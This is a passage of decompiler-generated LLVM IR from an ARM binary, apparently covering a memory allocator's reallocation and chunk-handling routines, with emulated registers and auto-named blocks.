  %v0_14e14 = call i32 @function_ce08()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_14e20 = inttoptr i32 %v0_14e14 to i32*
  store i32 12, i32* %v2_14e20, align 4
  br label %dec_label_pc_14eec

dec_label_pc_14e28:                               ; preds = %dec_label_pc_14e00.dec_label_pc_14e28_crit_edge, %dec_label_pc_14de0
  %v0_14e44 = phi i32 [ %v0_14e2c.pre, %dec_label_pc_14e00.dec_label_pc_14e28_crit_edge ], [ 142044, %dec_label_pc_14de0 ]
  %v2_14e2c = add i32 %v0_14e44, 72
  %v3_14e2c = inttoptr i32 %v2_14e2c to i32*
  %v4_14e2c = load i32, i32* %v3_14e2c, align 4
  store i32 %v4_14e2c, i32* @r4, align 4
  %v2_14e44 = add i32 %v0_14e44, 76
  %v3_14e44 = inttoptr i32 %v2_14e44 to i32*
  %v4_14e44 = load i32, i32* %v3_14e44, align 4
  store i32 %v4_14e44, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14e44)
  %v0_14e58 = load i32, i32* @r5, align 4
  %v2_14e58 = add i32 %v0_14e58, 16
  %v3_14e58 = inttoptr i32 %v2_14e58 to i32*
  %v4_14e58 = load i32, i32* %v3_14e58, align 4
  store i32 %v4_14e58, i32* %ip.global-to-local, align 4
  store i32 85604, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14e58)
  %v0_14e64 = load i32, i32* @r6, align 4
  %v1_14e68 = call i32 @function_fd60(i32 %v0_14e64)
  store i32 %v1_14e68, i32* %r4.global-to-local, align 4
  %v2_14e6c = icmp eq i32 %v1_14e68, 0
  br i1 %v2_14e6c, label %.thread, label %dec_label_pc_14e74

dec_label_pc_14e74:                               ; preds = %dec_label_pc_14e28
  %v1_14e74 = add i32 %v1_14e68, -4
  %v2_14e74 = inttoptr i32 %v1_14e74 to i32*
  %v3_14e74 = load i32, i32* %v2_14e74, align 4
  %v1_14e78 = and i32 %v3_14e74, 2
  %v2_14e78 = icmp eq i32 %v1_14e78, 0
  br i1 %v2_14e78, label %dec_label_pc_14e80, label %.thread

dec_label_pc_14e80:                               ; preds = %dec_label_pc_14e74
  %v1_14e807 = add i32 %v3_14e74, -4
  %v1_14e84 = and i32 %v1_14e807, -4
  store i32 %v1_14e84, i32* @r2, align 4
  %v3_14e88 = udiv i32 %v1_14e84, 4
  store i32 %v3_14e88, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_14e84, 36
  %v2_14e90 = icmp ult i32 %v1_14e84, 33
  %v3_14e90 = or i1 %tmp, %v2_14e90
  br i1 %v3_14e90, label %dec_label_pc_14e9c, label %dec_label_pc_14e94

dec_label_pc_14e94:                               ; preds = %dec_label_pc_14e80
  %v2_14e94 = inttoptr i32 %v1_14e68 to i8*
  %v3_14e94 = call i32 @function_f240(i8* %v2_14e94, i32 0)
  br label %.thread

dec_label_pc_14e9c:                               ; preds = %dec_label_pc_14e80
  %tmp8 = icmp eq i32 %v1_14e84, 16
  %v2_14ea0 = inttoptr i32 %v1_14e68 to i32*
  store i32 0, i32* %v2_14ea0, align 4
  %v1_14ea4 = load i32, i32* %r4.global-to-local, align 4
  %v2_14ea4 = add i32 %v1_14ea4, 4
  %v3_14ea4 = inttoptr i32 %v2_14ea4 to i32*
  store i32 0, i32* %v3_14ea4, align 4
  %v1_14ea8 = load i32, i32* %r4.global-to-local, align 4
  %v2_14ea8 = add i32 %v1_14ea8, 8
  %v3_14ea8 = inttoptr i32 %v2_14ea8 to i32*
  store i32 0, i32* %v3_14ea8, align 4
  %v2_14eac = icmp ult i32 %v1_14e84, 13
  %v3_14eac = or i1 %tmp8, %v2_14eac
  br i1 %v3_14eac, label %.thread, label %dec_label_pc_14eb0

dec_label_pc_14eb0:                               ; preds = %dec_label_pc_14e9c
  %v0_14eb0 = load i32, i32* %ip.global-to-local, align 4
  %v1_14eb4 = load i32, i32* %r4.global-to-local, align 4
  %v2_14eb4 = add i32 %v1_14eb4, 12
  %v3_14eb4 = inttoptr i32 %v2_14eb4 to i32*
  store i32 0, i32* %v3_14eb4, align 4
  %v1_14eb8 = load i32, i32* %r4.global-to-local, align 4
  %v2_14eb8 = add i32 %v1_14eb8, 16
  %v3_14eb8 = inttoptr i32 %v2_14eb8 to i32*
  store i32 0, i32* %v3_14eb8, align 4
  %tmp9 = icmp ult i32 %v0_14eb0, 7
  br i1 %tmp9, label %.thread, label %dec_label_pc_14ec0

dec_label_pc_14ec0:                               ; preds = %dec_label_pc_14eb0
  %v0_14ec0 = load i32, i32* %ip.global-to-local, align 4
  %v7_14ec0 = icmp eq i32 %v0_14ec0, 9
  %v1_14ec4 = load i32, i32* %r4.global-to-local, align 4
  %v2_14ec4 = add i32 %v1_14ec4, 20
  %v3_14ec4 = inttoptr i32 %v2_14ec4 to i32*
  store i32 0, i32* %v3_14ec4, align 4
  %v1_14ec8 = load i32, i32* %r4.global-to-local, align 4
  %v2_14ec8 = add i32 %v1_14ec8, 24
  %v3_14ec8 = inttoptr i32 %v2_14ec8 to i32*
  store i32 0, i32* %v3_14ec8, align 4
  br i1 %v7_14ec0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14ec0
  %v2_14ecc = load i32, i32* %r4.global-to-local, align 4
  %v3_14ecc = add i32 %v2_14ecc, 32
  %v4_14ecc = inttoptr i32 %v3_14ecc to i32*
  store i32 0, i32* %v4_14ecc, align 4
  %v2_14ed0 = load i32, i32* %r4.global-to-local, align 4
  %v3_14ed0 = add i32 %v2_14ed0, 28
  %v4_14ed0 = inttoptr i32 %v3_14ed0 to i32*
  store i32 0, i32* %v4_14ed0, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14ec0, %dec_label_pc_14e74, %dec_label_pc_14eb0, %dec_label_pc_14e9c, %dec_label_pc_14e28, %dec_label_pc_14e94, %bb
  %v0_14ee0 = load i32, i32* @r5, align 4
  %v2_14ee0 = add i32 %v0_14ee0, 24
  %v3_14ee0 = inttoptr i32 %v2_14ee0 to i32*
  %v4_14ee0 = load i32, i32* %v3_14ee0, align 4
  store i32 %v4_14ee0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_14ee0)
  br label %dec_label_pc_14eec

dec_label_pc_14eec:                               ; preds = %dec_label_pc_14e14, %.thread
  %v0_14eec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_14de0, i32* @r4, align 4
  store i32 %v6_14de0, i32* @r5, align 4
  store i32 %v9_14de0, i32* @r6, align 4
  store i32 %v12_14de0, i32* @lr, align 4
  ret i32 %v0_14eec

; uselistorder directives
  uselistorder i32 %v1_14e84, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 %v1_14e68, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 13, { 0, 3, 4, 5, 1, 6, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14eec, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_14f00(i32 %arg1) local_unnamed_addr {
dec_label_pc_14f00:
  %v0_14f00 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14f00, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_14f00
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14f00, %bb
  %v10_14f10 = phi i32 [ %arg1, %dec_label_pc_14f00 ], [ 0, %bb ]
  ret i32 %v10_14f10

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_14f14(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14f14:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_14f14 = load i32, i32* @r4, align 4
  %v6_14f14 = load i32, i32* @r5, align 4
  %v9_14f14 = load i32, i32* @r6, align 4
  %v12_14f14 = load i32, i32* @r7, align 4
  %v15_14f14 = load i32, i32* @r8, align 4
  %v18_14f14 = load i32, i32* @sb, align 4
  %v21_14f14 = load i32, i32* @sl, align 4
  %v24_14f14 = load i32, i32* @fp, align 4
  %v27_14f14 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_14f20 = icmp eq i32* %arg1, null
  store i32 142044, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_14f20, label %dec_label_pc_14f34, label %dec_label_pc_14f44

dec_label_pc_14f34:                               ; preds = %dec_label_pc_14f14
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_14f38 = call i32 @function_fd60(i32 %arg2)
  store i32 %v1_14f38, i32* %r0.global-to-local, align 4
  store i32 %v1_14f38, i32* @r4, align 4
  br label %dec_label_pc_1529c

dec_label_pc_14f44:                               ; preds = %dec_label_pc_14f14
  %v2_14f44 = icmp eq i32 %arg2, 0
  br i1 %v2_14f44, label %dec_label_pc_14f4c, label %dec_label_pc_14f58

dec_label_pc_14f4c:                               ; preds = %dec_label_pc_14f44
  %v0_14f4c = call i32 @function_108e4()
  store i32 %v0_14f4c, i32* %r0.global-to-local, align 4
  %v0_14f50 = load i32, i32* @r6, align 4
  store i32 %v0_14f50, i32* @r4, align 4
  br label %dec_label_pc_1529c

dec_label_pc_14f58:                               ; preds = %dec_label_pc_14f44
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_14f60 = load i32, i32* inttoptr (i32 142116 to i32*), align 4
  store i32 %v4_14f60, i32* @r4, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_14f60, i32* %r2.global-to-local, align 4
  %v4_14f6c = load i32, i32* inttoptr (i32 142080 to i32*), align 256
  store i32 %v4_14f6c, i32* %r1.global-to-local, align 4
  %v2_14f70 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_14f70, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_14f78 = load i32, i32* inttoptr (i32 142120 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_14f78)
  %v0_14f84 = load i32, i32* @r4, align 4
  store i32 %v0_14f84, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 142044, i32* %r1.global-to-local, align 4
  %v4_14f90 = load i32, i32* inttoptr (i32 142060 to i32*), align 4
  store i32 %v4_14f90, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_14f9c.624 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14f90)
  %v0_14f9c = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_14f9c, -32
  br i1 %tmp36, label %dec_label_pc_14fb8, label %dec_label_pc_14fa4

dec_label_pc_14fa4:                               ; preds = %dec_label_pc_14f58
  %v0_14fa4 = call i32 @function_ce08()
  store i32 %v0_14fa4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_14fb0 = inttoptr i32 %v0_14fa4 to i32*
  store i32 12, i32* %v2_14fb0, align 4
  br label %dec_label_pc_1529c

dec_label_pc_14fb8:                               ; preds = %dec_label_pc_14f58
  %v1_14fb8 = add i32 %v0_14f9c, 11
  store i32 %v1_14fb8, i32* %r0.global-to-local, align 4
  %v0_14fbc = load i32, i32* @r5, align 4
  %v1_14fbc = add i32 %v0_14fbc, -4
  %v2_14fbc = inttoptr i32 %v1_14fbc to i32*
  %v3_14fbc = load i32, i32* %v2_14fbc, align 4
  store i32 %v3_14fbc, i32* %r2.global-to-local, align 4
  %v2_14fc0 = icmp ugt i32 %v1_14fb8, 14
  %v7_14fc0 = icmp eq i32 %v1_14fb8, 15
  %v2_14fc4 = xor i1 %v2_14fc0, true
  %v3_14fc4 = or i1 %v7_14fc0, %v2_14fc4
  br i1 %v3_14fc4, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_14fb8
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_14fb8, %bb
  %v2_14fc8 = xor i1 %v7_14fc0, true
  %v3_14fc8 = and i1 %v2_14fc0, %v2_14fc8
  br i1 %v3_14fc8, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_14fc8 = and i32 %v1_14fb8, -8
  store i32 %v5_14fc8, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_14fcc = and i32 %v3_14fbc, 2
  %v2_14fcc = icmp eq i32 %v1_14fcc, 0
  %v1_14fd0 = add i32 %v0_14fbc, -8
  store i32 %v1_14fd0, i32* @sl, align 4
  %v1_14fd4 = and i32 %v3_14fbc, -4
  store i32 %v1_14fd4, i32* @r6, align 4
  br i1 %v2_14fcc, label %dec_label_pc_14fdc, label %dec_label_pc_151b4

dec_label_pc_14fdc:                               ; preds = %bb29
  %v1_14fdc = load i32, i32* @sb, align 4
  %v3_14fdc = icmp ult i32 %v1_14fd4, %v1_14fdc
  br i1 %v3_14fdc, label %dec_label_pc_14fe8, label %bb30

bb30:                                             ; preds = %dec_label_pc_14fdc
  store i32 %v1_14fd4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1514c

dec_label_pc_14fe8:                               ; preds = %dec_label_pc_14fdc
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_14ff0 = load i32, i32* inttoptr (i32 142076 to i32*), align 4
  store i32 %v4_14ff0, i32* %r0.global-to-local, align 4
  %v1_14ff4 = add i32 %v4_14ff0, 44
  %v2_14ff4 = inttoptr i32 %v1_14ff4 to i32*
  %v3_14ff4 = load i32, i32* %v2_14ff4, align 4
  store i32 %v3_14ff4, i32* %r3.global-to-local, align 4
  %v2_14ff8 = add i32 %v1_14fd4, %v1_14fd0
  store i32 %v2_14ff8, i32* @r4, align 4
  %v9_14ffc = icmp eq i32 %v2_14ff8, %v3_14ff4
  %v1_15000 = add i32 %v2_14ff8, 4
  %v2_15000 = inttoptr i32 %v1_15000 to i32*
  %v3_15000 = load i32, i32* %v2_15000, align 4
  store i32 %v3_15000, i32* %r1.global-to-local, align 4
  br i1 %v9_14ffc, label %dec_label_pc_15008, label %dec_label_pc_15044

dec_label_pc_15008:                               ; preds = %dec_label_pc_14fe8
  %v1_15008 = and i32 %v3_15000, -4
  %v2_1500c = add i32 %v1_15008, %v1_14fd4
  store i32 %v2_1500c, i32* %r1.global-to-local, align 4
  %v1_15010 = add i32 %v1_14fdc, 16
  store i32 %v1_15010, i32* %r3.global-to-local, align 4
  %v3_15014 = icmp ult i32 %v2_1500c, %v1_15010
  br i1 %v3_15014, label %dec_label_pc_15098, label %dec_label_pc_1501c

dec_label_pc_1501c:                               ; preds = %dec_label_pc_15008
  %v2_1501c = sub i32 %v2_1500c, %v1_14fdc
  %v1_15020 = urem i32 %v3_14fbc, 2
  %v2_15024 = add i32 %v1_14fdc, %v1_14fd0
  store i32 %v2_15024, i32* %r1.global-to-local, align 4
  %v2_15028 = or i32 %v1_14fdc, %v1_15020
  store i32 %v2_15028, i32* %r2.global-to-local, align 4
  %v1_1502c = or i32 %v2_1501c, 1
  store i32 %v1_1502c, i32* %r3.global-to-local, align 4
  store i32 %v0_14fbc, i32* @r4, align 4
  store i32 %v2_15028, i32* %v2_14fbc, align 4
  %v0_15038 = load i32, i32* %r1.global-to-local, align 4
  %v1_15038 = load i32, i32* %r0.global-to-local, align 4
  %v2_15038 = add i32 %v1_15038, 44
  %v3_15038 = inttoptr i32 %v2_15038 to i32*
  store i32 %v0_15038, i32* %v3_15038, align 4
  %v0_1503c = load i32, i32* %r3.global-to-local, align 4
  %v1_1503c = load i32, i32* %r1.global-to-local, align 4
  %v2_1503c = add i32 %v1_1503c, 4
  %v3_1503c = inttoptr i32 %v2_1503c to i32*
  store i32 %v0_1503c, i32* %v3_1503c, align 4
  br label %dec_label_pc_15280

dec_label_pc_15044:                               ; preds = %dec_label_pc_14fe8
  %v1_15044 = and i32 %v3_15000, -2
  %v2_15048 = add i32 %v1_15044, %v2_14ff8
  store i32 %v2_15048, i32* %r3.global-to-local, align 4
  %v1_1504c = add i32 %v2_15048, 4
  %v2_1504c = inttoptr i32 %v1_1504c to i32*
  %v3_1504c = load i32, i32* %v2_1504c, align 4
  store i32 %v3_1504c, i32* %r3.global-to-local, align 4
  %v1_15050 = urem i32 %v3_1504c, 2
  %v2_15050 = icmp eq i32 %v1_15050, 0
  br i1 %v2_15050, label %dec_label_pc_15058, label %dec_label_pc_15098

dec_label_pc_15058:                               ; preds = %dec_label_pc_15044
  %v1_15058 = and i32 %v3_15000, -4
  store i32 %v1_15058, i32* %r3.global-to-local, align 4
  %v2_1505c = add i32 %v1_15058, %v1_14fd4
  store i32 %v2_1505c, i32* %r0.global-to-local, align 4
  %v3_15060 = icmp ult i32 %v2_1505c, %v1_14fdc
  br i1 %v3_15060, label %dec_label_pc_15098, label %dec_label_pc_15068

dec_label_pc_15068:                               ; preds = %dec_label_pc_15058
  %v1_15068 = add i32 %v1_14fd4, %v0_14fbc
  %v2_15068 = inttoptr i32 %v1_15068 to i32*
  %v3_15068 = load i32, i32* %v2_15068, align 4
  store i32 %v3_15068, i32* %r1.global-to-local, align 4
  %v1_1506c = add i32 %v3_15068, 12
  %v2_1506c = inttoptr i32 %v1_1506c to i32*
  %v3_1506c = load i32, i32* %v2_1506c, align 4
  store i32 %v3_1506c, i32* %r3.global-to-local, align 4
  %v9_15070 = icmp eq i32 %v3_1506c, %v2_14ff8
  %v1_15074 = add i32 %v2_14ff8, 12
  %v2_15074 = inttoptr i32 %v1_15074 to i32*
  %v3_15074 = load i32, i32* %v2_15074, align 4
  store i32 %v3_15074, i32* %r2.global-to-local, align 4
  br i1 %v9_15070, label %dec_label_pc_1507c, label %dec_label_pc_15088

dec_label_pc_1507c:                               ; preds = %dec_label_pc_15068
  %v1_1507c = add i32 %v3_15074, 8
  %v2_1507c = inttoptr i32 %v1_1507c to i32*
  %v3_1507c = load i32, i32* %v2_1507c, align 4
  store i32 %v3_1507c, i32* %r3.global-to-local, align 4
  %v9_15080 = icmp eq i32 %v3_1507c, %v2_14ff8
  br i1 %v9_15080, label %dec_label_pc_1508c, label %dec_label_pc_15088

dec_label_pc_15088:                               ; preds = %dec_label_pc_15068, %dec_label_pc_1507c
  %v0_15088 = call i32 @function_10b60()
  store i32 %v0_15088, i32* %r0.global-to-local, align 4
  %v0_1508c.pre = load i32, i32* @r1, align 4
  %v1_1508c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1508c

dec_label_pc_1508c:                               ; preds = %dec_label_pc_1507c, %dec_label_pc_15088
  %v1_1508c = phi i32 [ %v3_15074, %dec_label_pc_1507c ], [ %v1_1508c.pre, %dec_label_pc_15088 ]
  %v0_1508c = phi i32 [ %v3_15068, %dec_label_pc_1507c ], [ %v0_1508c.pre, %dec_label_pc_15088 ]
  %v2_1508c = add i32 %v1_1508c, 8
  %v3_1508c = inttoptr i32 %v2_1508c to i32*
  store i32 %v0_1508c, i32* %v3_1508c, align 4
  %v0_15090 = load i32, i32* %r2.global-to-local, align 4
  %v1_15090 = load i32, i32* %r1.global-to-local, align 4
  %v2_15090 = add i32 %v1_15090, 12
  %v3_15090 = inttoptr i32 %v2_15090 to i32*
  store i32 %v0_15090, i32* %v3_15090, align 4
  %v1_1514c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1514c

dec_label_pc_15098:                               ; preds = %dec_label_pc_15008, %dec_label_pc_15058, %dec_label_pc_15044
  %v1_15098 = add i32 %v1_14fdc, -7
  store i32 %v1_15098, i32* %r0.global-to-local, align 4
  %v1_1509c = call i32 @function_fd60(i32 %v1_15098)
  store i32 %v1_1509c, i32* @r0, align 4
  store i32 %v1_1509c, i32* %r1.global-to-local, align 4
  %v2_150a0 = icmp eq i32 %v1_1509c, 0
  br i1 %v2_150a0, label %bb31, label %dec_label_pc_150ac

bb31:                                             ; preds = %dec_label_pc_15098
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_15280

dec_label_pc_150ac:                               ; preds = %dec_label_pc_15098
  %v1_150b4.pre = load i32, i32* @r4, align 4
  %v1_150ac = add i32 %v1_1509c, -4
  %v2_150ac = inttoptr i32 %v1_150ac to i32*
  %v3_150ac = load i32, i32* %v2_150ac, align 4
  store i32 %v3_150ac, i32* @r3, align 4
  %v1_150b0 = add i32 %v1_1509c, -8
  store i32 %v1_150b0, i32* @r7, align 4
  %v9_150b4 = icmp eq i32 %v1_150b0, %v1_150b4.pre
  br i1 %v9_150b4, label %.thread2, label %dec_label_pc_150c4

.thread2:                                         ; preds = %dec_label_pc_150ac
  %v2_150b8 = and i32 %v3_150ac, -4
  store i32 %v2_150b8, i32* %r3.global-to-local, align 4
  %v2_150bc = load i32, i32* @r6, align 4
  %v3_150bc = add i32 %v2_150bc, %v2_150b8
  store i32 %v3_150bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1514c

dec_label_pc_150c4:                               ; preds = %dec_label_pc_150ac
  %v0_150c4 = load i32, i32* @r6, align 4
  %v1_150c4 = add i32 %v0_150c4, -4
  store i32 %v1_150c4, i32* @r2, align 4
  %v3_150c8 = udiv i32 %v1_150c4, 4
  store i32 %v3_150c8, i32* @ip, align 4
  %tmp37 = and i32 %v1_150c4, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_150d0 = icmp ult i32 %v1_150c4, 36
  %v3_150d0 = or i1 %tmp38, %v2_150d0
  %v0_150e0 = load i32, i32* @r5, align 4
  br i1 %v3_150d0, label %dec_label_pc_150e0, label %dec_label_pc_150d4

dec_label_pc_150d4:                               ; preds = %dec_label_pc_150c4
  store i32 %v0_150e0, i32* @r1, align 4
  %v0_150d8 = call i32 @function_f350()
  store i32 %v0_150d8, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_150e0:                               ; preds = %dec_label_pc_150c4
  %v1_150e0 = inttoptr i32 %v0_150e0 to i32*
  %v2_150e0 = load i32, i32* %v1_150e0, align 4
  store i32 %v2_150e0, i32* %r3.global-to-local, align 4
  %v2_150e4 = inttoptr i32 %v1_1509c to i32*
  store i32 %v2_150e0, i32* %v2_150e4, align 4
  %v0_150e8 = load i32, i32* @r5, align 4
  %v1_150e8 = add i32 %v0_150e8, 4
  %v2_150e8 = inttoptr i32 %v1_150e8 to i32*
  %v3_150e8 = load i32, i32* %v2_150e8, align 4
  store i32 %v3_150e8, i32* %r3.global-to-local, align 4
  %v1_150ec = load i32, i32* %r1.global-to-local, align 4
  %v2_150ec = add i32 %v1_150ec, 4
  %v3_150ec = inttoptr i32 %v2_150ec to i32*
  store i32 %v3_150e8, i32* %v3_150ec, align 4
  %v0_150f0 = load i32, i32* @r5, align 4
  %v1_150f0 = add i32 %v0_150f0, 8
  %v2_150f0 = inttoptr i32 %v1_150f0 to i32*
  %v3_150f0 = load i32, i32* %v2_150f0, align 4
  store i32 %v3_150f0, i32* %r3.global-to-local, align 4
  %v0_150f4 = load i32, i32* @ip, align 4
  %v1_150f8 = load i32, i32* %r1.global-to-local, align 4
  %v2_150f8 = add i32 %v1_150f8, 8
  %v3_150f8 = inttoptr i32 %v2_150f8 to i32*
  store i32 %v3_150f0, i32* %v3_150f8, align 4
  %tmp39 = icmp ult i32 %v0_150f4, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_15100

dec_label_pc_15100:                               ; preds = %dec_label_pc_150e0
  %v0_15100 = load i32, i32* @r5, align 4
  %v1_15100 = add i32 %v0_15100, 12
  %v2_15100 = inttoptr i32 %v1_15100 to i32*
  %v3_15100 = load i32, i32* %v2_15100, align 4
  store i32 %v3_15100, i32* %r3.global-to-local, align 4
  %v1_15104 = load i32, i32* %r1.global-to-local, align 4
  %v2_15104 = add i32 %v1_15104, 12
  %v3_15104 = inttoptr i32 %v2_15104 to i32*
  store i32 %v3_15100, i32* %v3_15104, align 4
  %v0_15108 = load i32, i32* @r5, align 4
  %v1_15108 = add i32 %v0_15108, 16
  %v2_15108 = inttoptr i32 %v1_15108 to i32*
  %v3_15108 = load i32, i32* %v2_15108, align 4
  store i32 %v3_15108, i32* %r3.global-to-local, align 4
  %v0_1510c = load i32, i32* @ip, align 4
  %v1_15110 = load i32, i32* %r1.global-to-local, align 4
  %v2_15110 = add i32 %v1_15110, 16
  %v3_15110 = inttoptr i32 %v2_15110 to i32*
  store i32 %v3_15108, i32* %v3_15110, align 4
  %tmp40 = icmp ult i32 %v0_1510c, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_15118

dec_label_pc_15118:                               ; preds = %dec_label_pc_15100
  %v0_15118 = load i32, i32* @r5, align 4
  %v1_15118 = add i32 %v0_15118, 20
  %v2_15118 = inttoptr i32 %v1_15118 to i32*
  %v3_15118 = load i32, i32* %v2_15118, align 4
  store i32 %v3_15118, i32* %r3.global-to-local, align 4
  %v1_1511c = load i32, i32* %r1.global-to-local, align 4
  %v2_1511c = add i32 %v1_1511c, 20
  %v3_1511c = inttoptr i32 %v2_1511c to i32*
  store i32 %v3_15118, i32* %v3_1511c, align 4
  %v0_15120 = load i32, i32* @r5, align 4
  %v1_15120 = add i32 %v0_15120, 24
  %v2_15120 = inttoptr i32 %v1_15120 to i32*
  %v3_15120 = load i32, i32* %v2_15120, align 4
  store i32 %v3_15120, i32* %r3.global-to-local, align 4
  %v1_15124 = load i32, i32* %r1.global-to-local, align 4
  %v2_15124 = add i32 %v1_15124, 24
  %v3_15124 = inttoptr i32 %v2_15124 to i32*
  store i32 %v3_15120, i32* %v3_15124, align 4
  %v0_15128 = load i32, i32* @ip, align 4
  %v7_15128 = icmp eq i32 %v0_15128, 9
  br i1 %v7_15128, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_15118
  %v1_1512c = load i32, i32* @r5, align 4
  %v2_1512c = add i32 %v1_1512c, 28
  %v3_1512c = inttoptr i32 %v2_1512c to i32*
  %v4_1512c = load i32, i32* %v3_1512c, align 4
  store i32 %v4_1512c, i32* %r3.global-to-local, align 4
  %v2_15130 = load i32, i32* %r1.global-to-local, align 4
  %v3_15130 = add i32 %v2_15130, 28
  %v4_15130 = inttoptr i32 %v3_15130 to i32*
  store i32 %v4_1512c, i32* %v4_15130, align 4
  %v1_15134 = load i32, i32* @r5, align 4
  %v2_15134 = add i32 %v1_15134, 32
  %v3_15134 = inttoptr i32 %v2_15134 to i32*
  %v4_15134 = load i32, i32* %v3_15134, align 4
  store i32 %v4_15134, i32* %r3.global-to-local, align 4
  %v2_15138 = load i32, i32* %r1.global-to-local, align 4
  %v3_15138 = add i32 %v2_15138, 32
  %v4_15138 = inttoptr i32 %v3_15138 to i32*
  store i32 %v4_15134, i32* %v4_15138, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_15118, %dec_label_pc_15100, %dec_label_pc_150e0, %dec_label_pc_150d4, %bb32
  %v0_1513c = load i32, i32* @r5, align 4
  store i32 %v0_1513c, i32* @r0, align 4
  %v0_15140 = call i32 @function_108e4()
  store i32 %v0_15140, i32* %r0.global-to-local, align 4
  %v0_15144 = load i32, i32* @r7, align 4
  %v1_15144 = add i32 %v0_15144, 8
  store i32 %v1_15144, i32* @r4, align 4
  br label %dec_label_pc_15280

dec_label_pc_1514c:                               ; preds = %bb30, %.thread2, %dec_label_pc_1508c
  %v0_15160 = phi i32 [ %v3_150bc, %.thread2 ], [ %v1_14fd4, %bb30 ], [ %v1_1514c.pre, %dec_label_pc_1508c ]
  %v0_1514c = load i32, i32* @sb, align 4
  %v2_1514c = sub i32 %v0_15160, %v0_1514c
  store i32 %v2_1514c, i32* %r1.global-to-local, align 4
  %v0_15154 = load i32, i32* @sl, align 4
  %v1_15154 = add i32 %v0_15154, 4
  %v2_15154 = inttoptr i32 %v1_15154 to i32*
  %v3_15154 = load i32, i32* %v2_15154, align 4
  %tmp41 = icmp ugt i32 %v2_1514c, 15
  %v1_1517c = urem i32 %v3_15154, 2
  store i32 %v1_1517c, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_1517c, label %dec_label_pc_1515c

dec_label_pc_1515c:                               ; preds = %dec_label_pc_1514c
  %v2_15160 = or i32 %v1_1517c, %v0_15160
  store i32 %v2_15160, i32* %r3.global-to-local, align 4
  store i32 %v2_15160, i32* %v2_15154, align 4
  %v0_15168 = load i32, i32* @sl, align 4
  %v1_15168 = load i32, i32* %r0.global-to-local, align 4
  %v2_15168 = add i32 %v1_15168, %v0_15168
  store i32 %v2_15168, i32* %r2.global-to-local, align 4
  %v1_1516c = add i32 %v2_15168, 4
  %v2_1516c = inttoptr i32 %v1_1516c to i32*
  %v3_1516c = load i32, i32* %v2_1516c, align 4
  %v1_15170 = or i32 %v3_1516c, 1
  store i32 %v1_15170, i32* %r3.global-to-local, align 4
  store i32 %v1_15170, i32* %v2_1516c, align 4
  br label %dec_label_pc_151ac

dec_label_pc_1517c:                               ; preds = %dec_label_pc_1514c
  %v2_15180 = add i32 %v0_15154, %v0_1514c
  store i32 %v2_15180, i32* %r0.global-to-local, align 4
  %v2_15184 = or i32 %v1_1517c, %v0_1514c
  store i32 %v2_15184, i32* %r3.global-to-local, align 4
  %v1_15188 = or i32 %v2_1514c, 1
  store i32 %v1_15188, i32* %r2.global-to-local, align 4
  store i32 %v2_15184, i32* %v2_15154, align 4
  %v0_15190 = load i32, i32* %r2.global-to-local, align 4
  %v1_15190 = load i32, i32* %r0.global-to-local, align 4
  %v2_15190 = add i32 %v1_15190, 4
